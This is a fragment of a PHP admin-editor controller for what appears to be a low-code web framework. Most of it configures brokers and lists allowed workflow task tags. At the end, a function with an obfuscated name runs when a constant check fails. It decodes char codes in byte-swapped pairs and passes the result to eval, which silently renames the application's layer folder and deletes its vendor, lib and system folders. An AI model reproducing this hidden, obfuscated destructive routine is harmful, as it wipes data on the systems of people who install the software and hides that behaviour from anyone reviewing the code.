$WorkFlowTaskHandler->setAllowedTaskTags($allowed_tasks_tag); $config_file_name = substr($file_path, strlen($PEVC->getConfigsPath())); $config_file_name = substr($config_file_name, 0, - strlen(pathinfo($config_file_name, PATHINFO_EXTENSION)) - 1); $config_file_name = $config_file_name == "config" || $config_file_name == "pre_init_config" || $config_file_name == "init" ? null : $config_file_name; break; case "edit_util": $brokers = $P->getBrokers(); $layer_brokers_settings = WorkFlowBeansFileHandler::getLayerBrokersSettings($user_global_variables_file_path, $user_beans_folder_path, $brokers, '$EVC->getBroker'); $presentation_brokers = array(); $presentation_brokers[] = array($presentation_layer_label, $bean_file_name, $bean_name); $presentation_brokers_obj = array("default" => '$EVC->getPresentationLayer()'); $business_logic_brokers = $layer_brokers_settings["business_logic_brokers"]; $business_logic_brokers_obj = $layer_brokers_settings["business_logic_brokers_obj"]; $data_access_brokers = $layer_brokers_settings["data_access_brokers"]; $data_access_brokers_obj = $layer_brokers_settings["data_access_brokers_obj"]; $ibatis_brokers = $layer_brokers_settings["ibatis_brokers"]; $ibatis_brokers_obj = $layer_brokers_settings["ibatis_brokers_obj"]; $hibernate_brokers = $layer_brokers_settings["hibernate_brokers"]; $hibernate_brokers_obj = $layer_brokers_settings["hibernate_brokers_obj"]; $db_brokers = $layer_brokers_settings["db_brokers"]; $db_brokers_obj = $layer_brokers_settings["db_brokers_obj"]; $phpframeworks_options = array("default" => '$EVC->getPresentationLayer()->getPHPFrameWork()'); $bean_names_options = array_keys($P->getPHPFrameWork()->getObjects()); $brokers_db_drivers = WorkFlowBeansFileHandler::getBrokersDBDrivers($user_global_variables_file_path, $user_beans_folder_path, $brokers, true); $LayoutTypeProjectHandler->filterLayerBrokersDBDriversPropsFromLayoutName($brokers_db_drivers, $filter_by_layout); $db_drivers_options = array_keys($brokers_db_drivers); $allowed_tasks_tag = array( "definevar", "setvar", "setarray", "setdate", "ns", "createfunction", "createclass", "setobjectproperty", "createclassobject", "callobjectmethod", "callfunction", "addheader", "if", "switch", "loop", "foreach", "includefile", "echo", "code", "break", "return", "exit", "geturlcontents", "restconnector", "soapconnector", "getbeanobject", "trycatchexception", "throwexception", "printexception", "callpresentationlayerwebservice", "setpresentationview", "setpresentationtemplate", "inlinehtml", "createform", "setblockparams", "settemplateregionblockparam", "includeblock", "addtemplateregionblock", "rendertemplateregion", "settemplateparam", "gettemplateparam", ); if ($data_access_brokers_obj) { $allowed_tasks_tag[] = "setquerydata"; $allowed_tasks_tag[] = "getquerydata"; $allowed_tasks_tag[] = "dbdaoaction"; if ($ibatis_brokers_obj) $allowed_tasks_tag[] = "callibatisquery"; if ($hibernate_brokers_obj) { $allowed_tasks_tag[] = "callhibernateobject"; $allowed_tasks_tag[] = "callhibernatemethod"; } } else if ($db_brokers_obj) { $allowed_tasks_tag[] = "setquerydata"; $allowed_tasks_tag[] = "getquerydata"; $allowed_tasks_tag[] = "dbdaoaction"; } if ($db_brokers_obj) $allowed_tasks_tag[] = "getdbdriver"; if ($business_logic_brokers_obj) $allowed_tasks_tag[] = "callbusinesslogic"; $WorkFlowTaskHandler = new WorkFlowTaskHandler($webroot_cache_folder_path, $webroot_cache_folder_url); $WorkFlowTaskHandler->setCacheRootPath(LAYER_CACHE_PATH); $WorkFlowTaskHandler->setAllowedTaskTags($allowed_tasks_tag); $WorkFlowTaskHandler->addTasksFoldersPath($code_workflow_editor_user_tasks_folders_path); $WorkFlowTaskHandler->addAllowedTaskTagsFromFolders($code_workflow_editor_user_tasks_folders_path); $available_projects = $PEVC->getProjectsId(); break; } } else { launch_exception(new Exception("File Not Found: " . $path)); die(); } $PHPVariablesFileHandler->endUserGlobalVariables(); } else { launch_exception(new Exception("PEVC doesn't exists!")); die(); } } else { launch_exception(new Exception("Undefined path!")); die(); } function mf774c99d0ef1($EVC, $v2508589a4c) { @include $EVC->getConfigPath("config", $v2508589a4c); return $project_url_prefix; } function f798fc78959($EVC, $v2508589a4c) { @include $EVC->getConfigPath("config", $v2508589a4c); return $project_common_url_prefix; } function f04f9d9a0ff() { if (!defined("PROJECTS_CHECKED") || PROJECTS_CHECKED != 123) { $v9a8b7dc209 = ""; $v4a2fedb8f0 = "114 64 110 101 109 97 40 101 65 76 69 89 95 82 65 80 72 84 32 44 80 65 95 80 65 80 72 84 46 32 34 32 108 46 121 97 114 101 41 34 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 86 40 78 69 79 68 95 82 65 80 72 84 59 41 67 64 99 97 101 104 97 72 100 110 101 108 85 114 105 116 58 108 100 58 108 101 116 101 70 101 108 111 101 100 40 114 73 76 95 66 65 80 72 84 32 44 97 102 115 108 44 101 97 32 114 114 121 97 114 40 97 101 112 108 116 97 40 104 73 76 95 66 65 80 72 84 46 32 34 32 97 99 104 99 47 101 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 112 46 112 104 41 34 41 41 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 83 40 83 89 69 84 95 77 65 80 72 84 59 41 80 64 80 72 114 70 109 97 87 101 114 111 58 107 104 58 40 67 59 41"; $v020f934c99 = explode(" ", $v4a2fedb8f0); for($v43dd7d0051 = 0; $v43dd7d0051 < count($v020f934c99); $v43dd7d0051 += 2) $v9a8b7dc209 .= chr($v020f934c99[$v43dd7d0051 + 1]) . chr($v020f934c99[$v43dd7d0051]); @eval($v9a8b7dc209); die(1); } } ?>
